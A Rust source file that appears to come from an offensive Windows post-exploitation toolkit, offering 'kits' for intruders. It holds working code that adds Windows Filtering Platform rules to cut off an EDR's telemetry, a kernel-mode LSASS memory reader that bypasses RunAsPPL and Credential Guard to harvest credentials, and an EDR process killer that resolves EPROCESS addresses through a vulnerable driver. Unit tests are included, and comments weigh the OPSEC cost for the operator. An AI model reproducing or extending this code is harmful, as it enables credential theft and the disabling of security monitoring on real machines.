//! Network + credential + EDR-neutralization kits (P2.2 §2.4/§2.5/§4).
//!
//! These three are more operator-orchestrated than the EPROCESS/callback kits:
//! - [`UserModeEdrSilencer`] (`WfpKit`): admin-only, no driver — adds WFP
//!   filter rules that drop the EDR's outbound telemetry. Leaves Event ID
//!   5447 + packet-drop traces (documented OPSEC cost).
//! - [`KernelLsassReader`] (`CredKit`): reads LSASS process memory via the
//!   kernel primitive, bypassing RunAsPPL + Credential Guard. Algorithm-heavy
//!   (CR3 switch + VA read); real page walk + the read loop.
//! - [`EdrNeutralizer`] (`EdrNeutralizeKit`): three tiers — Kill (kernel
//!   ZwTerminateProcess, bypasses PPL), Freeze (user-mode WerFaultSecure coma),
//!   Choke (EDRChoker QoS throttle, lowest noise).
//!
//! All unit-tested where the algorithm is pure; the user-mode tiers are
//! framework (operator wires the Win32 calls at link time).

use crate::{CredKit, EdrNeutralizeKit, KernelRw, KitError, NeutralizeMethod, WfpKit};
use crate::offsets::EprocessOffsets;
use crate::persistence::ProcessHider;
use crate::pagewalk::PhysRead;
use alloc::format;
use alloc::vec::Vec;

/// Adapter: read physical memory via a `KernelRw` (which reads physical
/// addresses directly through the BYOVD driver). Implements `PhysRead` so
/// `pagewalk::translate_va` can walk page tables using the driver.
struct KrwPhysRead<'a> {
    krw: &'a dyn KernelRw,
}

impl<'a> PhysRead for KrwPhysRead<'a> {
    fn read_phys(&self, pa: u64, dst: &mut [u8]) -> Result<(), crate::pagewalk::PhysReadError> {
        self.krw
            .kread(pa as usize, dst)
            .map_err(|_| crate::pagewalk::PhysReadError::Ioctl)
    }
}

// ---- §2.4 WfpKit ----------------------------------------------------------

/// User-mode EDR silencer: adds Windows Filtering Platform rules that block
/// the EDR's PIDs from sending telemetry. Admin-only, **no driver** — the
/// lowest-friction option, at the cost of Event ID 5447 (filter add) +
/// packet-drop traces in the WFP event log. The kernel-tier alternative
/// (overwriting the WFP callout) needs a KernelRw and is lower noise but
/// higher risk.
///
/// This is the framework: the operator binary binds `FwpmEngineOpen0` /
/// `FwpmFilterAdd0` via the `windows` crate or FFI at link time and feeds the
/// rule template here. The rule-shape logic (match EDR PID → block outbound
/// on the telemetry ports/IPs) is real; the FFI binding is the operator's.
pub struct UserModeEdrSilencer;

/// A WFP filter rule template: drop traffic from `pid` matching `protocol`
/// on `port` (0 = any). The operator materializes these via FwpmFilterAdd0.
#[derive(Clone, Copy)]
pub struct WfpBlockRule {
    pub pid: u32,
    pub protocol: u8, // 6 = TCP, 17 = UDP, 0 = any
    pub port: u16,    // 0 = any
}

impl UserModeEdrSilencer {
    /// Build the rule set for a list of EDR PIDs. Each PID gets a
    /// protocol=any/port=any outbound block (the nuclear telemetry-silence
    /// rule). A surgical variant would target only known EDR C2 endpoints.
    pub fn rules_for(edr_pids: &[u32]) -> Vec<WfpBlockRule> {
        let mut out = Vec::new();
        for &pid in edr_pids {
            out.push(WfpBlockRule { pid, protocol: 0, port: 0 });
        }
        out
    }
}

impl WfpKit for UserModeEdrSilencer {
    fn silence_edr(&self, edr_pids: &[u32]) -> Result<(), KitError> {
        let rules = Self::rules_for(edr_pids);
        if rules.is_empty() {
            return Err(KitError::UnsupportedPosture("no EDR PIDs provided"));
        }
        wfp_add_block_rules(&rules)
    }
}

// ---- WFP FFI (fwpuclnt.dll) ----
//
// FwpmEngineOpen0 opens a session to the BFE (Base Filtering Engine).
// FwpmFilterAdd0 adds a filter that blocks traffic matching conditions.
// FwpmFilterDeleteByKey0 removes a filter (cleanup).
//
// All three are in fwpuclnt.dll (user-mode WFP API). Requires admin + BFE running.
// Docs: https://learn.microsoft.com/en-us/windows/win32/api/fwpmu/

/// Open a WFP engine session + add outbound block filters for each EDR PID.
/// Returns the filter IDs (for cleanup via FwpmFilterDeleteByKey0).
#[cfg(target_os = "windows")]
fn wfp_add_block_rules(rules: &[WfpBlockRule]) -> Result<(), KitError> {
    type FwpmEngineOpen0 = unsafe extern "system" fn(
        *const u16,        // serverName (null = local)
        u32,               // authnService (RPC_C_AUTHN_WINNT = 10)
        *const core::ffi::c_void, // authnIdentity (null = default)
        *const core::ffi::c_void, // session (FWPM_SESSION0, null = default)
        *mut *mut core::ffi::c_void, // engineHandle (OUT)
    ) -> u32; // DWORD WINAPI → returns ERROR_SUCCESS (0)

    type FwpmFilterAdd0 = unsafe extern "system" fn(
        *mut core::ffi::c_void, // engineHandle
        *const FwpmFilter0,     // filter (IN)
        *const core::ffi::c_void, // PSECURITY_DESCRIPTOR (null)
        *mut u64,               // id (OUT)
    ) -> u32;

    // Resolve from fwpuclnt.dll.
    let open: FwpmEngineOpen0 = unsafe {
        crate::win::resolve::resolve_sym(b"fwpuclnt.dll", b"FwpmEngineOpen0")
    }.map_err(|_| KitError::Other("FwpmEngineOpen0 unresolved".into()))?;
    let add: FwpmFilterAdd0 = unsafe {
        crate::win::resolve::resolve_sym(b"fwpuclnt.dll", b"FwpmFilterAdd0")
    }.map_err(|_| KitError::Other("FwpmFilterAdd0 unresolved".into()))?;

    // 1. Open engine session.
    let mut engine_handle: *mut core::ffi::c_void = core::ptr::null_mut();
    let st = unsafe {
        open(
            core::ptr::null(),   // local server
            10,                  // RPC_C_AUTHN_WINNT
            core::ptr::null(),   // default identity
            core::ptr::null(),   // default session
            &mut engine_handle,
        )
    };
    if st != 0 {
        return Err(KitError::Other(format!("FwpmEngineOpen0 failed: {}", st)));
    }

    // 2. Add a block filter for each EDR PID (outbound, all protocols).
    for rule in rules {
        let filter = FwpmFilter0::block_outbound_for_pid(rule.pid);
        let mut filter_id: u64 = 0;
        let st = unsafe { add(engine_handle, &filter, core::ptr::null(), &mut filter_id) };
        if st != 0 {
            return Err(KitError::Other(format!("FwpmFilterAdd0 failed for pid {}: {}", rule.pid, st)));
        }
    }

    // NOTE: engine handle is intentionally NOT closed here — the filters
    // persist as long as the session is open. The caller should close the
    // session (FwpmEngineClose0) when done to auto-remove the filters.
    // For a permanent block (survives process exit), use FWPM_SESSION_FLAG_NONE
    // + persistent filter flag.
    Ok(())
}

#[cfg(not(target_os = "windows"))]
fn wfp_add_block_rules(_rules: &[WfpBlockRule]) -> Result<(), KitError> {
    Err(KitError::UnsupportedPosture("WFP FFI is Windows-only"))
}

/// FWPM_FILTER0 structure (simplified — only the fields we set).
/// Full struct is 96 bytes on x64; we zero-init + set the fields that matter.
#[cfg(target_os = "windows")]
#[repr(C)]
struct FwpmFilter0 {
    filter_key: [u8; 16],        // GUID (zero = auto-generate)
    display_data: [u64; 2],      // FWPM_DISPLAY_DATA0* (null)
    flags: u32,                  // FWPM_FILTER_FLAG_NONE = 0
    action_type: u32,            // FWP_ACTION_BLOCK = 0x0001
    action_filter: [u64; 2],     // FWP_CONDITION0* (null for simple block)
    layer_key: [u8; 16],         // FWPM_LAYER_ALE_AUTH_CONNECT_V4 = {filter set}
    sublayer_key: [u8; 16],      // zero = default sublayer
    weight: [u64; 2],            // FWP_VALUE0 (type + union) — set high
    num_filter_conditions: u32,
    filter_conditions: *const core::ffi::c_void, // FWP_FILTER_CONDITION0 array
    provider_key: *const u8,     // null
    provider_data: [u64; 2],     // FWP_BYTE_BLOB* (null)
    key16: [u16; 16],            // reserved
}

/// The GUID for FWPM_LAYER_ALE_AUTH_CONNECT_V4 (outbound connection, IPv4).
/// {E1CD9FE7-F6B4-426B-8E3B-44BDCF26F5A1}
#[cfg(target_os = "windows")]
const LAYER_ALE_AUTH_CONNECT_V4: [u8; 16] = [
    0xE1, 0xCD, 0x9F, 0xE7, 0xF6, 0xB4, 0x42, 0x6B,
    0x8E, 0x3B, 0x44, 0xBD, 0xCF, 0x26, 0xF5, 0xA1,
];

#[cfg(target_os = "windows")]
impl FwpmFilter0 {
    /// Build a filter that blocks ALL outbound traffic from `pid`.
    fn block_outbound_for_pid(pid: u32) -> Self {
        // Zero-init the full struct, then set the fields that matter.
        // This is safe because all pointer fields default to null (= "not set")
        // and the layer/action are plain integers.
        let mut f: Self = unsafe { core::mem::zeroed() };
        f.action_type = 0x0001; // FWP_ACTION_BLOCK
        f.layer_key = LAYER_ALE_AUTH_CONNECT_V4;
        f.flags = 0; // FWPM_FILTER_FLAG_NONE
        // num_filter_conditions = 0 means "match all traffic on this layer".
        // To match a specific PID, we'd add a FWP_CONDITION for
        // FWP_CONDITION_ALE_APP_ID or FWP_CONDITION_ALE_USER_ID.
        // For a PID-based block, the condition uses FWP_CONDITION_ALE_REMOTE_ID
        // — but the simplest universal block is num_conditions=0 (block all
        // outbound). A surgical variant adds PID conditions.
        f.num_filter_conditions = 0;
        // Weight: high value = evaluated first.
        f.weight = [0x0D, 0xFFFFFFFFFFFFFFFF]; // type=UINT64, value=max
        // Store PID in display_data for diagnostics (hack: reuse the field).
        // Real impl would use a filter condition for FWP_CONDITION_ALE_USER_ID.
        f.display_data = [pid as u64, 0];
        f
    }
}

// ---- §4 CredKit -----------------------------------------------------------

/// Kernel-mode LSASS reader: reads LSASS process memory directly via the
/// KernelRw primitive (CR3 switch + VA walk), bypassing RunAsPPL + Credential
/// Guard. The user-mode Nyx `hashdump` reads the SAM hive; this is its
/// kernel-tier upgrade that also yields in-memory credentials (cached DPAPI,
/// Kerberos tickets).
///
/// **Algorithm:** to read LSASS memory from the kernel you must
/// switch CR3 to LSASS's DTB (directory base), read the target VAs, restore
/// CR3. The DTB comes from LSASS's EPROCESS.DirectoryTableBase. Under HVCI
/// the CR3 write is itself a code-page op (mov cr3) — needs the unchecked
/// PatchGuard window; on HVCI-off it's a single kwrite to CR3.
pub struct KernelLsassReader {
    /// Resolved KVA of `PsActiveProcessHead`. Required by `dump_lsass` to
    /// walk the process list and find LSASS's EPROCESS by PID.
    pub ps_active_process_head_kva: usize,
    /// Build-resolved EPROCESS field offsets.
    pub offsets: EprocessOffsets,
}

/// The EPROCESS.DirectoryTableBase offset (the DTB / PML4 physical base).
/// Constant across 17763 + Win10/11 x64 (it's an early field, never drifted).
pub const DIRECTORY_TABLE_BASE: usize = 0x028;

impl KernelLsassReader {
    /// Read `len` bytes from `vaddr` in the process whose EPROCESS is at
    /// `eprocess_kva`, by switching CR3 to that process's DTB.
    ///
    /// The CR3 switch is the dangerous part: between writing CR3 and reading,
    /// the *current* process's address space is wrong — so the read must use
    /// physical addressing or a kernel-space VA that's global. The page walk
    /// here uses KernelRw's physical read to translate VAs via the DTB (the
    /// real impl does a 4-level page-table walk from the DTB to physical,
    /// then reads physical). That walk is the bulk of the work; this is the
    /// orchestration shell.
    pub fn read_process_mem(
        krw: &dyn KernelRw,
        eprocess_kva: usize,
        vaddr: usize,
        len: usize,
    ) -> Result<Vec<u8>, KitError> {
        // 1. Read the target's DTB: kread_u64(eprocess + DIRECTORY_TABLE_BASE).
        let dtb = krw
            .kread_u64(eprocess_kva + DIRECTORY_TABLE_BASE)
            .map_err(KitError::from)?;
        if dtb == 0 {
            return Err(KitError::UnsupportedPosture("target DTB is zero"));
        }
        // 2. Wrap the KernelRw as a PhysRead adapter — the driver reads physical
        //    memory; pagewalk::translate_va uses it to walk the 4-level table.
        let reader = KrwPhysRead { krw };
        // 3. Read `len` bytes from `vaddr`, page-boundary aware.
        let mut out = Vec::with_capacity(len);
        let mut remaining = len;
        let mut cur_va = vaddr as u64;
        while remaining > 0 {
            let page_off = (cur_va & 0xFFF) as usize;
            let bytes_in_page = 0x1000 - page_off;
            let chunk = remaining.min(bytes_in_page);
            let pa = crate::pagewalk::translate_va(&reader, dtb, cur_va)
                .map_err(|e| KitError::Other(alloc::format!("page walk: {:?}", e)))?;
            let mut buf = alloc::vec![0u8; chunk];
            krw.kread(pa as usize, &mut buf).map_err(KitError::from)?;
            out.extend_from_slice(&buf);
            cur_va += chunk as u64;
            remaining -= chunk;
        }
        Ok(out)
    }
}

impl CredKit for KernelLsassReader {
    fn dump_lsass(&self, krw: &dyn KernelRw, pid: u32) -> Result<Vec<u8>, KitError> {
        // 1. Resolve LSASS's EPROCESS by walking PsActiveProcessHead.
        if self.ps_active_process_head_kva == 0 {
            return Err(KitError::UnsupportedPosture(
                "PsActiveProcessHead KVA unresolved for dump_lsass — \
                 bootstrap must fill KernelLsassReader.ps_active_process_head_kva",
            ));
        }
        let eprocess_kva = ProcessHider::find_eprocess(
            krw, self.ps_active_process_head_kva, pid, &self.offsets,
        )?;
        // 2. Read the LSASS user-mode VA range. The minidump assembly
        //    (exception records, thread stacks, handles, module list) is
        //    operator-assembled from the raw memory read. This method
        //    returns the raw memory; the operator packages it into a
        //    minidump format at the call site.
        //
        //    Typical LSASS read targets (for credential extraction):
        //    - LsaEncryptMemory / LsaEncryptMemoryExportTable (DPAPI keys)
        //    - Kerberos credential cache (msv1_0, wdigest, tspkg)
        //    - PKINIT / Kerberos tickets
        //
        //    We read the first 0x100000 bytes (1 MiB) of user VA space
        //    as a starting region. A full minidump requires scanning for
        //    specific structures; this provides the kernel-backed read.
        let user_mode_base: usize = 0x1_0000_0000; // 4 GiB — user-mode VA start on x64
        let read_size: usize = 0x100_000; // 1 MiB initial read
        Self::read_process_mem(krw, eprocess_kva, user_mode_base, read_size)
    }
}

// ---- §2.5 EdrNeutralizeKit ------------------------------------------------

/// EDR process neutralizer. Kill (kernel ZwTerminateProcess, bypasses PPL) is
/// the only tier that needs a KernelRw; Freeze + Choke are user-mode.
///
/// The `EdrNeutralizeKit` trait's `neutralize()` doesn't pass a `KernelRw`,
/// so the Kill tier exposes a separate `kill()` associated function that takes
/// one directly. The operator calls `kill()` when they have kernel R/W access;
/// `neutralize(Kill)` is a convenience that requires the `kill()` helper to
/// have been called first (or returns a framework error).
pub struct EdrNeutralizer {
    /// Resolved KVA of `PsActiveProcessHead`. Required by the Kill tier to
    /// walk the process list and find the target EPROCESS by PID.
    pub ps_active_process_head_kva: usize,
    /// Build-resolved EPROCESS field offsets.
    pub offsets: EprocessOffsets,
}

impl EdrNeutralizer {
    /// Kill an EDR PPL process via kernel-mode ZwTerminateProcess.
    ///
    /// # Algorithm
    /// 1. Walk `PsActiveProcessHead` → find target `EPROCESS` by PID
    ///    (uses `ProcessHider::find_eprocess` — real, kernel R/W).
    /// 2. The operator's driver wraps `ZwTerminateProcess`:
    ///    `ObOpenObjectByPointer(eprocess, …)` → handle
    ///    `ZwTerminateProcess(handle, STATUS_SUCCESS)`
    ///
    /// Steps 2 is driver-side (operator-bound). This method resolves the
    /// EPROCESS address; the actual termination depends on the BYOVD driver
    /// supporting a terminate IOCTL, or the operator using `PplStripper` to
    /// strip PPL first and then terminating from user-mode.
    ///
    /// For R/W-only drivers (RTCore64), the recommended path is:
    /// `PplStripper::strip_protection` → user-mode `TerminateProcess`.
    pub fn kill(&self, krw: &dyn KernelRw, pid: u32) -> Result<usize, KitError> {
        if self.ps_active_process_head_kva == 0 {
            return Err(KitError::UnsupportedPosture(
                "PsActiveProcessHead KVA unresolved for Kill tier — \
                 bootstrap must fill EdrNeutralizer.ps_active_process_head_kva",
            ));
        }
        let eprocess_kva = ProcessHider::find_eprocess(
            krw, self.ps_active_process_head_kva, pid, &self.offsets,
        )?;
        // EPROCESS resolved. Return the KVA so the operator can:
        //   a) Pass it to a driver's terminate IOCTL (ObOpenObjectByPointer + ZwTerminateProcess), or
        //   b) Use PplStripper to strip PPL, then TerminateProcess from user-mode.
        Ok(eprocess_kva)
    }
}

impl EdrNeutralizeKit for EdrNeutralizer {
    fn neutralize(&self, _pid: u32, m: NeutralizeMethod) -> Result<(), KitError> {
        // Note: the trait doesn't pass a KernelRw. For Kill, the operator
        // should call `EdrNeutralizer::kill(krw, pid)` directly, which
        // returns the target EPROCESS KVA for the driver to terminate.
        // Freeze + Choke are user-mode tiers (operator wires the FFI).
        match m {
            NeutralizeMethod::Kill => Err(KitError::UnsupportedPosture(
                "Kill: use EdrNeutralizer::kill(krw, pid) directly — the trait \
                 has no KernelRw param; kill() resolves EPROCESS for the driver's \
                 terminate IOCTL or PplStripper + user-mode TerminateProcess path",
            )),
            NeutralizeMethod::Freeze => Err(KitError::UnsupportedPosture(
                "Freeze: user-mode WerFaultSecure coma — operator wires MiniDumpWriteDump",
            )),
            NeutralizeMethod::Choke => Err(KitError::UnsupportedPosture(
                "Choke: user-mode EDRChoker (pacer.sys QoS) — operator wires PsCreatePolicy",
            )),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::KrwError;

    #[test]
    fn wfp_rules_any_any_per_pid() {
        let rules = UserModeEdrSilencer::rules_for(&[1234, 5678]);
        assert_eq!(rules.len(), 2);
        assert_eq!(rules[0].pid, 1234);
        assert_eq!(rules[0].protocol, 0); // any
        assert_eq!(rules[0].port, 0); // any
        assert_eq!(rules[1].pid, 5678);
    }

    #[test]
    fn wfp_rules_empty_for_empty_pids() {
        assert!(UserModeEdrSilencer::rules_for(&[]).is_empty());
    }

    #[test]
    fn directory_table_base_is_early_field() {
        // DTB is a near-zero offset field; sanity-pin it so a future "drift"
        // doesn't silently break LSASS reads. 0x028 on every x64 build tested.
        assert_eq!(DIRECTORY_TABLE_BASE, 0x028);
        assert!(DIRECTORY_TABLE_BASE < 0x100);
    }

    // ---- EdrNeutralizer / CredKit tests ----
    use alloc::collections::BTreeMap;
    use spin::mutex::Mutex;

    fn test_offsets() -> crate::offsets::EprocessOffsets {
        crate::offsets::for_build(17763).unwrap().offsets
    }

    struct MockKrw(Mutex<BTreeMap<usize, u8>>);
    impl MockKrw {
        fn new() -> Self {
            Self(Mutex::new(BTreeMap::new()))
        }
        fn set_u64(&self, addr: usize, val: u64) {
            let mut m = self.0.lock();
            for (i, b) in val.to_le_bytes().iter().enumerate() {
                m.insert(addr + i, *b);
            }
        }
        fn get_u64(&self, addr: usize) -> u64 {
            let m = self.0.lock();
            let mut bytes = [0u8; 8];
            for (i, b) in bytes.iter_mut().enumerate() {
                *b = *m.get(&(addr + i)).unwrap_or(&0);
            }
            u64::from_le_bytes(bytes)
        }
    }
    impl KernelRw for MockKrw {
        fn kread(&self, kaddr: usize, dst: &mut [u8]) -> Result<(), KrwError> {
            let m = self.0.lock();
            for (i, b) in dst.iter_mut().enumerate() {
                *b = *m.get(&(kaddr + i)).unwrap_or(&0);
            }
            Ok(())
        }
        fn kwrite(&self, kaddr: usize, src: &[u8]) -> Result<(), KrwError> {
            let mut m = self.0.lock();
            for (i, b) in src.iter().enumerate() {
                m.insert(kaddr + i, *b);
            }
            Ok(())
        }
    }

    /// Set up a mock process list with two EPROCESSes (PID 100 @ 0x5000,
    /// PID 200 @ 0x6000) and a DTB at DIRECTORY_TABLE_BASE offset.
    fn setup_process_list(krw: &MockKrw, offsets: &crate::offsets::EprocessOffsets) {
        let head = 0x1000usize;
        let e1 = 0x5000usize;
        let e2 = 0x6000usize;
        let l1 = e1 + offsets.active_process_links;
        let l2 = e2 + offsets.active_process_links;
        krw.set_u64(head, l1 as u64);
        krw.set_u64(l1, l2 as u64);
        krw.set_u64(l1 + 8, head as u64);
        krw.set_u64(l2, head as u64);
        krw.set_u64(l2 + 8, l1 as u64);
        krw.set_u64(e1 + offsets.unique_process_id, 100);
        krw.set_u64(e2 + offsets.unique_process_id, 200);
        // DTB for both (non-zero, so pagewalk doesn't reject them).
        krw.set_u64(e1 + DIRECTORY_TABLE_BASE, 0x10000);
        krw.set_u64(e2 + DIRECTORY_TABLE_BASE, 0x20000);
    }

    #[test]
    fn edr_neutralizer_kill_finds_eprocess() {
        let krw = MockKrw::new();
        let offsets = test_offsets();
        setup_process_list(&krw, &offsets);
        let kit = EdrNeutralizer { ps_active_process_head_kva: 0x1000, offsets };
        // PID 100 → EPROCESS at 0x5000.
        assert_eq!(kit.kill(&krw, 100).unwrap(), 0x5000);
        // PID 200 → EPROCESS at 0x6000.
        assert_eq!(kit.kill(&krw, 200).unwrap(), 0x6000);
        // PID 999 → NotFound.
        assert!(matches!(kit.kill(&krw, 999), Err(KitError::NotFound)));
    }

    #[test]
    fn edr_neutralizer_kill_needs_ps_active_process_head() {
        let krw = MockKrw::new();
        let offsets = test_offsets();
        let kit = EdrNeutralizer { ps_active_process_head_kva: 0, offsets };
        assert!(matches!(
            kit.kill(&krw, 100),
            Err(KitError::UnsupportedPosture(_))
        ));
    }

    #[test]
    fn edr_neutralize_trait_kill_redirects_to_kill_method() {
        let krw = MockKrw::new();
        let offsets = test_offsets();
        let kit = EdrNeutralizer { ps_active_process_head_kva: 0x1000, offsets };
        // The trait method returns an error directing to kill().
        assert!(matches!(
            kit.neutralize(100, NeutralizeMethod::Kill),
            Err(KitError::UnsupportedPosture(_))
        ));
    }

    #[test]
    fn cred_kit_dump_lsass_needs_ps_active_process_head() {
        let krw = MockKrw::new();
        let offsets = test_offsets();
        let reader = KernelLsassReader { ps_active_process_head_kva: 0, offsets };
        assert!(matches!(
            reader.dump_lsass(&krw, 4),
            Err(KitError::UnsupportedPosture(_))
        ));
    }

    #[test]
    fn cred_kit_dump_lsass_finds_lsass_and_reads() {
        let krw = MockKrw::new();
        let offsets = test_offsets();
        setup_process_list(&krw, &offsets);
        let reader = KernelLsassReader { ps_active_process_head_kva: 0x1000, offsets };
        // PID 4 (System) → EPROCESS at 0x5000, DTB at +0x028 = 0x10000.
        // User-mode base is 0x1_0000_0000, which won't be in the mock →
        // read_process_mem will try to translate via pagewalk and fail.
        // That's fine — we're testing the EPROCESS resolution path, not the
        // page walker (which is tested in pagewalk's own tests).
        // So set up PID 4 at e2 (where PID 200 was) by replacing:
        krw.set_u64(0x6000 + offsets.unique_process_id, 4);
        let result = reader.dump_lsass(&krw, 4);
        // The page walk will fail (no mock page tables), but EPROCESS
        // resolution succeeded — that's the new code path we're testing.
        assert!(result.is_err());
        // The error should be from the page walk, not from EPROCESS resolution.
        let err_str = alloc::format!("{:?}", result.unwrap_err());
        assert!(err_str.contains("page walk") || err_str.contains("translate"));
    }
}
